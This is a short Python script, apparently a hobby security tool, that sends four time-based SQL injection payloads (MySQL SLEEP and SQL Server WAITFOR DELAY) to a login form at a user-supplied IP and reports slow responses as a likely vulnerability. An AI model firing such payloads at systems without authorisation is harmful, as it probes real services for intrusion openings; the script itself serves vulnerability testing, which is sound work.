# -*- coding: utf-8 -*-
"""
Created on Fri Feb  21 03:345:47 2025

@author: IAN CARTER KULANI

"""

from colorama import Fore
import pyfiglet
import os
font=pyfiglet.figlet_format("TIME BASED SQL INJECTION DETECTOR")
print(Fore.GREEN+font)

import requests
import time

# Function to detect Time-Based SQL Injection by analyzing response time
def detect_time_based_sql_injection(ip_address):
    print(f"Checking for potential Time-Based SQL Injection on {ip_address}...")

    # SQL injection payloads commonly used to detect Time-Based SQL Injection
    payloads = [
        "'; SLEEP(5) --",   # Time delay of 5 seconds (MySQL)
        "'; WAITFOR DELAY '00:00:05' --",  # Time delay for SQL Server
        "' OR IF(1=1, SLEEP(5), 0) --",   # Another MySQL time delay
        "' AND IF(1=1, SLEEP(5), 0) --",  # Time delay with AND condition (MySQL)
    ]
    
    # Target URL for testing (you can modify this based on the actual endpoint)
    url = f"http://{ip_address}/login"  # Example URL, adjust based on the target app

    for payload in payloads:
        try:
            # Measure the time for each request with the payload
            data = {'username': payload, 'password': 'password'}
            
            # Start the timer for measuring response time
            start_time = time.time()
            response = requests.post(url, data=data)
            end_time = time.time()

            # Calculate response time (in seconds)
            response_time = end_time - start_time

            # Detect Time-Based SQL Injection by checking for delay
            if response_time >= 5:  # If the response time is greater than a threshold (e.g., 5 seconds)
                print(f"[!] Time-Based SQL Injection detected with payload: {payload}")
                print(f"Response time: {response_time:.2f} seconds")
            else:
                print(f"[+] No time delay detected for payload: {payload}")

        except requests.exceptions.RequestException as e:
            print(f"[!] Error making request: {e}")

# Main function to start the detection process
def main():
       
    # Prompt the user for an IP address to test for Time-Based SQL Injection
    ip_address = input("Enter the target IP address:")
    
    # Start detecting Time-Based SQL Injection
    detect_time_based_sql_injection(ip_address)

if __name__ == "__main__":
    main()
